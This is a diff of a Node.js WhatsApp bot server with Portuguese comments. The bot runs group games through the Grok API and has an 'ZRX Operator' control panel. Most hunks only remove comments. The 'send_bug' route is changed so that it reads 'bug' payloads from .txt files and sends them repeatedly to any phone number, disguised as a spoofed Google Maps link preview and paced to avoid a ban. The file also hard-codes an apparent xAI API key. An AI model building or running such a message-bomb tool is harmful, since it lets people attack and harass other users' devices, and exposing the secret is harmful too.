@@ -8,12 +8,11 @@ let waSock = null;
 let reconectando = false;
 let statusConexaoAtual = "OFFLINE";
 let ultimoCodigoGerado = "--------";
-let modosBrincadeira = {}; // Armazena grupos com brincadeira ativa
+let modosBrincadeira = {};
 
 const XAI_API_KEY = process.env.XAI_API_KEY || "xai-It1hSBKgDociGem1UrHCDQuAAEBU6uLNpd12ORpiRMf1VobVtBqSPnYU31s120O7ehCNvGDVIXMou6xW";
 const PORT = process.env.PORT || 3000;
 
-// Função para consultar o Grok
 async function consultarGrok(prompt, systemPrompt = "Você é um mestre de jogos e brincadeiras interativas para grupos no WhatsApp. Seja divertido, direto e dinâmico.") {
     try {
         const response = await fetch("https://api.x.ai/v1/responses", {
@@ -54,7 +53,6 @@ const server = http.createServer(async (req, res) => {
 
     const urlObj = new URL(req.url, `http://${req.headers.host}`);
 
-    // Rota: Conectar e gerar código de pareamento
     if (urlObj.pathname === '/api/conectar' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -79,7 +77,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // Rota: Obter Lista de Grupos
     if (urlObj.pathname === '/api/grupos' && req.method === 'GET') {
         try {
             if (!waSock || statusConexaoAtual !== "ONLINE") {
@@ -102,7 +99,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // Rota: Limpar Sessão no Servidor
     if (urlObj.pathname === '/api/limpar' && req.method === 'POST') {
         try {
             const pastaSessao = path.join(__dirname, 'sessao_teste');
@@ -124,7 +120,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // Rota: Execução de Comandos de Grupo e Disparo de Bugs dos TXT
     if (urlObj.pathname === '/api/comando' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -137,7 +132,6 @@ const server = http.createServer(async (req, res) => {
                 }
                 const { acao, grupoId, param, extraData } = JSON.parse(body);
 
-                // Ativar/Desativar Brincadeira via Painel
                 if (acao === 'toggle_brincadeira' && grupoId) {
                     modosBrincadeira[grupoId] = (param === 'on');
                     const statusText = modosBrincadeira[grupoId] ? "ATIVADO" : "DESATIVADO";
@@ -147,22 +141,32 @@ const server = http.createServer(async (req, res) => {
                     return;
                 }
 
-                // Disparo de Bug puxando direto dos arquivos .txt do repositório
+                // Disparo de mensagens com suporte à pré-visualização de links (Cards do Maps)
                 if (acao === 'send_bug' && param && extraData) {
                     const targetJid = `${param.replace(/\D/g, '')}@s.whatsapp.net`;
                     const arquivoTxt = extraData.file;
                     const quantidade = parseInt(extraData.amount) || 1;
 
                     const filePath = path.join(__dirname, arquivoTxt);
-                    let payloadText = "⚠️ Payload de teste ZRX";
+                    let payloadText = "https://maps.google.com\n⚠️ Payload ZRX";
 
                     if (fs.existsSync(filePath)) {
                         payloadText = fs.readFileSync(filePath, 'utf8');
                     }
 
                     for (let i = 0; i < quantidade; i++) {
-                        await waSock.sendMessage(targetJid, { text: payloadText });
-                        await delay(1000); // Intervalo de 1 segundo entre os envios para evitar banimento imediato
+                        // Envia com suporte a preview de link para gerar o card verde do mapa
+                        await waSock.sendMessage(targetJid, { 
+                            text: payloadText,
+                            linkPreview: {
+                                "canonical-url": "https://maps.google.com",
+                                "matched-text": payloadText.split('\n')[0],
+                                "title": "Google Maps",
+                                "description": "Localização",
+                                "jpegThumbnail": null
+                            }
+                        });
+                        await delay(1000);
                     }
 
                     res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -190,7 +194,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // Status Geral
     if (urlObj.pathname === '/api/status' && req.method === 'GET') {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ status: statusConexaoAtual, codigo: ultimoCodigoGerado }));
@@ -205,7 +208,6 @@ server.listen(PORT, () => {
     console.log(`Servidor HTTP rodando na porta ${PORT}`);
 });
 
-// Escutador de mensagens para os comandos /br e /comecar nos grupos
 function escutarMensagensWhatsApp() {
     if (!waSock) return;
 
@@ -221,7 +223,6 @@ function escutarMensagensWhatsApp() {
 
             if (!isGroup) continue;
 
-            // Comando /br
             if (textoMsg.toLowerCase().trim() === '/br') {
                 if (!modosBrincadeira[from]) {
                     await waSock.sendMessage(from, { text: "⚠️ O Modo Brincadeiras está desativado neste grupo. Ative-o pelo painel ZRX Operator!" });
@@ -239,7 +240,6 @@ function escutarMensagensWhatsApp() {
                 await waSock.sendMessage(from, { text: menuText });
             }
 
-            // Comando /comecar
             if (textoMsg.toLowerCase().startsWith('/comecar')) {
                 if (!modosBrincadeira[from]) {
                     await waSock.sendMessage(from, { text: "⚠️ O Modo Brincadeiras está desativado neste grupo. Ative pelo painel primeiro!" });
@@ -305,7 +305,7 @@ async function iniciarWhatsApp(numeroTelefone) {
         } else if (connection === 'open') {
             reconectando = false;
             statusConexaoAtual = "ONLINE";
-            escutarMensagensWhatsApp(); // Ativa o ouvinte de mensagens ao conectar
+            escutarMensagensWhatsApp();
         }
     });
 
